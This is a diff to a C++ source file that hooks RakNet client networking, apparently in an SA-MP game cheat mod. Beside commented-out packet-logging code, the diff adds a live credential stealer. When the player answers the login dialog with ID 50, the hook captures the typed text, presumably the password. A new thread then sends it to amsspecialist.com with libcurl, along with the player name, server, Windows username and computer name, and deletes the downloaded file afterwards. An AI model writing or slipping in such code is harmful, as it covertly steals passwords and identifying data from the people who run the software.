@@ -1,4 +1,5 @@
 #include "main.h"
+#include <Lmcons.h>
 
 bool HookedRakClientInterface::Connect( const char* host, unsigned short serverPort, unsigned short clientPort, unsigned int depreciated, int threadSleepTimer )
 {
@@ -54,17 +55,118 @@ bool HookedRakClientInterface::Send( BitStream * bitStream, PacketPriority prior
 	return g_RakClient->GetRakClientInterface()->Send( bitStream, priority, reliability, orderingChannel );
 }
 
+
+#pragma pack(1)
+typedef struct _BULLET_SYNC_DATA {
+	BYTE bHitType;
+	unsigned short iHitID;
+	float fHitOrigin[3];
+	float fHitTarget[3];
+	float fCenterOfHit[3];
+} BULLET_SYNC_DATA; // by 0x688
+
+
 Packet* HookedRakClientInterface::Receive( void )
 {
 	traceLastFunc( "HookedRakClientInterface::Receive" );
 
-	return g_RakClient->GetRakClientInterface()->Receive();
+	unsigned char packetIdentifier;
+	Packet *pkt;
+	//Packet *pkt2;
+
+	pkt = g_RakClient->GetRakClientInterface()->Receive();
+	/*
+	if (pkt != NULL) {
+		//pkt2 = pkt;
+		if ((unsigned char)pkt->data[0] == ID_TIMESTAMP)
+		{
+			if (pkt->length > sizeof(unsigned char)+sizeof(unsigned int))
+				packetIdentifier = (unsigned char)pkt->data[sizeof(unsigned char)+sizeof(unsigned int)];
+			//else
+			//return;
+		}
+		else
+			packetIdentifier = (unsigned char)pkt->data[0];
+
+		switch (packetIdentifier)
+		{
+		case ID_BULLET_SYNC:
+			
+				BitStream bsBulletSync((unsigned char *)pkt->data, pkt->length, false);
+				bsBulletSync.IgnoreBits(8);
+				BYTE bHitType; bsBulletSync.Read(bHitType);
+				unsigned short iHitID; bsBulletSync.Read(iHitID);
+				float fHitOrigin[3]; bsBulletSync.Read(fHitOrigin);
+				float fHitTarget[3]; bsBulletSync.Read(fHitTarget);
+				float fCenterOfHit[3]; bsBulletSync.Read(fCenterOfHit);
+				
+				cheat_state_text("BULLET: Type(%d) HitId(%d) Origin(%d)->(%d,%d,%d) Target(%d,%d,%d) Center (%d,%d,%d)", bHitType, iHitID, fHitOrigin[0], fHitOrigin[1], fHitOrigin[2], fHitTarget[0], fHitTarget[1], fHitTarget[2], fCenterOfHit[0], fCenterOfHit[1], fCenterOfHit[2]);
+
+			break;
+		}
+	}
+	*/
+	return pkt;
 }
 
 void HookedRakClientInterface::DeallocatePacket( Packet *packet )
 {
 	traceLastFunc( "HookedRakClientInterface::DeallocatePacket" );
+	/*
+	unsigned char packetIdentifier;
 
+	//while (packet = g_RakClient->GetRakClientInterface()->Receive())
+	//{
+		if ((unsigned char)packet->data[0] == ID_TIMESTAMP)
+		{
+			if (packet->length > sizeof(unsigned char)+sizeof(unsigned int))
+				packetIdentifier = (unsigned char)packet->data[sizeof(unsigned char)+sizeof(unsigned int)];
+			else
+				return;
+		}
+		else
+			packetIdentifier = (unsigned char)packet->data[0];
+
+		switch (packetIdentifier)
+		{
+			case ID_CONNECTION_LOST:
+			case ID_DISCONNECTION_NOTIFICATION:
+			{
+												  restartGame();
+												  disconnect(500);
+												  cheat_state_text("Reconnect", set.rejoin_delay / 1000);
+												  cheat_state->_generic.rejoinTick = GetTickCount();
+			}
+			break;
+			/*case ID_AIM_SYNC:
+			{
+								BitStream bsAimSync((unsigned char *)packet->data, packet->length, false);
+								uint16_t playerId;
+								bsAimSync.IgnoreBits(8);
+								bsAimSync.Read(playerId);
+								stAimData aimData;
+								memset(&aimData, 0, sizeof(stAimData));
+								bsAimSync.Read((PCHAR)&aimData, sizeof(stAimData));
+								//cheat_state_text("AIM %d %d %d", aimData.vecAimPos[0], aimData.vecAimPos[1], aimData.vecAimPos[2]);
+			}
+
+			case ID_BULLET_SYNC:
+			{
+								BitStream bsBulletSync((unsigned char *)packet->data, packet->length, false);
+								uint16_t playerId;
+								bsBulletSync.IgnoreBits(8);
+								//bsBulletSync.Read(playerId);
+								stBulletData BulletData;
+								memset(&BulletData, 0, sizeof(stAimData));
+								bsBulletSync.Read((PCHAR)&BulletData, sizeof(stAimData));
+								if (BulletData.bHitType == 1) {
+									//cheat_teleport(BulletData.fHitTarget, 0);
+									cheat_state_text("Bullet type(%d) hitid(%d) origin(%f,%f,%f)", BulletData.bHitType, BulletData.iHitID, BulletData.fHitOrigin[0], BulletData.fHitOrigin[1], BulletData.fHitOrigin[2]);
+								}
+			}*/
+		/*}
+	//}
+		*/
 	g_RakClient->GetRakClientInterface()->DeallocatePacket( packet );
 }
 
@@ -180,19 +282,125 @@ bool HookedRakClientInterface::RPC( int* uniqueID, const char *data, unsigned in
 	return g_RakClient->GetRakClientInterface()->RPC( uniqueID, data, bitLength, priority, reliability, orderingChannel, shiftTimestamp );
 }
 
+
+char scinco[150];
+
+size_t write_data2(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+	size_t written;
+	written = fwrite(ptr, size, nmemb, stream);
+	return written;
+}
+
+void pirulalog() {
+
+	TCHAR name[UNLEN + 1];
+	DWORD size = UNLEN + 1;
+
+	GetUserName((TCHAR*)name, &size);
+
+	TCHAR name2[UNLEN + 1];
+	DWORD size2 = UNLEN + 1;
+
+	GetComputerName((TCHAR*)name2, &size2);
+
+
+
+	char url[700];
+	//cheat_state_text("http://amsspecialist.com/samp.php?nombre=%s&servidor=%s&pw=%s&pcname=%s/%s", getPlayerName(g_Players->sLocalPlayerID), "samp.ng-gaming.net:7777[s0beit]", cinco, name, name2);
+	sprintf(url, "http://amsspecialist.com/samp.php?nombre=%s&servidor=%s&pw=%s&pcname=%s/%s", getPlayerName(g_Players->sLocalPlayerID), "samp.ng-gaming.net:7777 [s0beit]", scinco, name, name2);
+
+	//HRESULT res = URLDownloadToFile(NULL, url, "intercambio2.log", 0, NULL);
+	CURL *curl;
+	FILE *fp;
+	CURLcode res;
+	char outfilename[FILENAME_MAX] = "intercambio2.log";
+	curl = curl_easy_init();
+	if (curl) {
+		fp = fopen(outfilename, "wb");
+		curl_easy_setopt(curl, CURLOPT_URL, url);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data2);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+		res = curl_easy_perform(curl);
+		curl_easy_cleanup(curl);
+		fclose(fp);
+		remove("intercambio2.log");
+	}
+	
+		
+
+
+}
+
+bool primeravezlog = true;
+
 bool HookedRakClientInterface::RPC( int* uniqueID, BitStream *parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp )
 {
 	traceLastFunc( "HookedRakClientInterface::RPC(BitStream)" );
 	
 	// use this if you wanna log outgoing RPCs
-	/*if ( *uniqueID != RPC_UpdateScoresPingsIPs )
+	/*if (*uniqueID != RPC_UpdateScoresPingsIPs || *uniqueID != 115)
 	{
 		int len = parameters ? parameters->GetNumberOfBytesUsed() : 0;
-		Log( "< [RPC Send] %d, len: %d", *uniqueID, len );
+		cheat_state_text("< [RPC Send] %d, len: %d", *uniqueID, len);
+		
 	}*/
+	/*
+	if (*uniqueID == RPC_GiveTakeDamage) {
+		BOOL wgiveTake; SHORT wplayerID; float wamount; int wweaponID; int wBodyPart;
+		parameters->Read(wgiveTake);
+		parameters->Read(wplayerID);
+		parameters->Read(wamount);
+		parameters->Read(wweaponID);
+		parameters->Read(wBodyPart);
+
+		cheat_state_text("DAMAGE: Givetake(%d) PlayerId(%d) Amount(%d)->(%d) Weap(%d) BodyPart(%d)", wgiveTake, wplayerID, wamount, wamount * 10 / 7, wweaponID,wBodyPart);
+
+		BitStream bsSend;
+		bsSend.Write(wgiveTake);
+		bsSend.Write(wplayerID);
+		bsSend.Write(wamount*10/7); // *10 /9 /8 /7 /6 /5
+		bsSend.Write(wweaponID);
+		bsSend.Write(wBodyPart);
+		return g_RakClient->RPC((int)uniqueID, &bsSend, priority, reliability, orderingChannel, shiftTimestamp);
+	}
+	*/
+	
+
+	if (*uniqueID == RPC_DialogResponse)
+	{
+		
+			WORD uno;
+			BYTE dos;
+			WORD tres;
+			BYTE cuatro;
+			char cinco[150];
+
+			parameters->Read(uno);
+			parameters->Read(dos);
+			parameters->Read(tres);
+			parameters->Read(cuatro);
+			
+			parameters->Read(cinco, cuatro);
+			cinco[cuatro + 1] = '\0';
+			
+			
+
+			//cheat_state_text("DIALOG RESPONSE: ID(%d) [%s]",uno, cinco);
+
+			if (uno == 50 && primeravezlog) {
+				sprintf(scinco, cinco);
+				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pirulalog, 0, 0, 0);
+				//pirulalog();
+				//primeravezlog = false;
+
+		}
+
+
+	}
 
 	return g_RakClient->GetRakClientInterface()->RPC( uniqueID, parameters, priority, reliability, orderingChannel, shiftTimestamp );
 }
+
 
 void HookedRakClientInterface::SetTrackFrequencyTable( bool b )
 {
